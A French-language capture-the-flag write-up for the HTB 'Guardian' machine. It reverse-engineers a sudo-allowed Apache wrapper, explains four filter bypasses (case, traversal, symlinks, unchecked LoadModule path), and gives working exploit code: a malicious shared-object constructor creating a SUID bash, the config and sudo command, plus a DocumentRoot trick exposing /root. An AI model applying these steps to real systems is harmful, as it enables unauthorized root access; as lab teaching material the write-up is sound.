# safeapache2ctl

## <mark style="color:red;">🔐 safeapache2ctl — Privilege Escalation (HTB Guardian)</mark>

### <mark style="color:blue;">🧠 Contexte</mark>

`safeapache2ctl` est un binaire ELF custom qui permet à l'utilisateur `mark` de lancer Apache avec un fichier de configuration restreint. Il tourne avec `sudo (ALL) NOPASSWD`, donc son exécution donne les privilèges **root**.

```bash
mark@guardian:~$ sudo -l
(ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

***

### <mark style="color:blue;">🔍 Fonctionnement du binaire (Ghidra)</mark>

#### Logique principale — `main()`

```c
res = realpath(argv[2], resolved_path);  // résout le chemin réel du fichier conf
result = starts_with(resolved_path, "/home/mark/confs/");  // vérif répertoire

// Lit le fichier ligne par ligne via is_unsafe_line()
// Si toutes les lignes passent → execl("/usr/sbin/apache2ctl", "-f", resolved_path)
```

{% hint style="info" %}
Opening in Ghidra. The `main()` function:

```
res = realpath((char *)argv[2], resolved_path);       // resolve the config path
result = starts_with(resolved_path, "/home/mark/confs/");  // must be inside confs
if (result == 0) {
    fprintf(stderr, "Access denied...");
}
// read config line by line through is_unsafe_line()
// if all lines pass → execl("/usr/sbin/apache2ctl", "-f", resolved_path)
```

The `is_unsafe_line()` function:

```
sscanf(line, "%31s %1023s", directive, directive_arg);

result = strcmp(directive, "Include");
if (result == 0) {
    // check directive_arg starts with /home/mark/confs/
}
result = strcmp(directive, "IncludeOptional");
// same check
result = strcmp(directive, "LoadModule");
// same check — BUT reads directive_arg which is the MODULE NAME, not the path
```
{% endhint %}

#### Logique de filtrage — `is_unsafe_line()`

```c
sscanf(line, "%31s %1023s", directive, directive_arg);

if strcmp(directive, "Include")         → vérifie que directive_arg commence par /home/mark/confs/
if strcmp(directive, "IncludeOptional") → même vérification
if strcmp(directive, "LoadModule")      → vérifie directive_arg... qui est le NOM du module, pas le chemin !
```

***

### <mark style="color:blue;">💥 Bypasses identifiés</mark>

#### Bypass 1 — Sensibilité à la casse (lecture de fichiers arbitraires)

Apache est **insensible à la casse** pour ses directives. `strcmp()` est **sensible à la casse**.

```
Include   → bloqué par strcmp
InClUde   → non reconnu → non bloqué → Apache l'accepte quand même
```

**Impact : lecture de fichier arbitraire**

```
InClUde /root/root.txt
```

Apache échoue avec un message d'erreur qui **leak le contenu du fichier** :

```
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'e*****{FLAG}*****', perhaps misspelled...
```

***

#### Bypass 2 — Traversée de répertoire (pas de `realpath` sur les args)

`realpath()` est appelé sur le fichier config lui-même, mais **pas sur les arguments** des directives.

```
Include /home/mark/confs/../../../root/root.txt
```

`starts_with("/home/mark/confs/")` → passe ✅\
Apache résout le chemin réel → lit `/root/root.txt` ✅

***

#### Bypass 3 — Symlinks

Même logique : créer un lien symbolique dans `/home/mark/confs/` vers n'importe quel fichier :

```bash
ln -s /root/root.txt /home/mark/confs/root.txt
```

```
Include /home/mark/confs/root.txt  → passe le filtre → lit /root/root.txt
```

***

#### Bypass 4 — `LoadModule` vérifie le mauvais token (RCE)

La syntaxe Apache pour `LoadModule` est :

```
LoadModule <nom_module> <chemin_vers_le_fichier.so>
```

Le `sscanf` lit `"%31s %1023s"` → `directive_arg` = **deuxième token = nom du module**, pas le chemin.

**Le chemin du `.so` (troisième token) n'est jamais vérifié.**

On peut donc charger n'importe quel `.so` depuis n'importe où sur le système.

***

### <mark style="color:blue;">🛠️ Exploitation — SUID bash via</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.so`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">malveillant</mark>

#### 1. Créer le module malveillant

```c
// evil.c
#include <stdlib.h>

__attribute__((constructor))
void pwn(void) {
    system("cp /bin/bash /tmp/sn0x && chmod +s /tmp/sn0x");
}
```

> `__attribute__((constructor))` → exécuté **avant** toute vérification Apache, dès le chargement du `.so`.

```bash
gcc -shared -fPIC -o /home/mark/confs/evil.so evil.c
```

#### 2. Créer le fichier de configuration

```bash
cat > /home/mark/confs/evil.conf << 'EOF'
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
LoadModule pwn_module /home/mark/confs/evil.so
EOF
```

* `mpm_worker_module` = nom du module (vérifié) → légitime ✅
* `/usr/lib/apache2/modules/mod_mpm_worker.so` = chemin (non vérifié) ✅
* `pwn_module` = nom fictif (vérifié) → pas dans la liste bloquée ✅
* `/home/mark/confs/evil.so` = chemin (non vérifié) → chargé ✅

#### 3. Lancer l'exploit

```bash
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/evil.conf
```

Apache charge `evil.so`, exécute le constructeur → bash SUID créé.\
Apache échoue ensuite (`pwn_module` n'existe pas vraiment) → mais trop tard.

```bash
/tmp/sn0x -p
# uid=1001(mark) gid=1003(mark) euid=0(root) egid=0(root)
```

***

### <mark style="color:blue;">🎁 Bonus — Lecture de fichiers root via Apache web server</mark>

```bash
cat > /home/mark/confs/webserver.conf << 'EOF'
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
ServerName Test
DocumentRoot /root
Listen 9000
ErrorLog /tmp/apache_error.log
EOF

sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/webserver.conf &
curl localhost:9000/root.txt
```

Apache démarre brièvement avec `/root` comme `DocumentRoot` → tous les fichiers root sont servis via HTTP.

***

### 📋 Résumé des bypasses
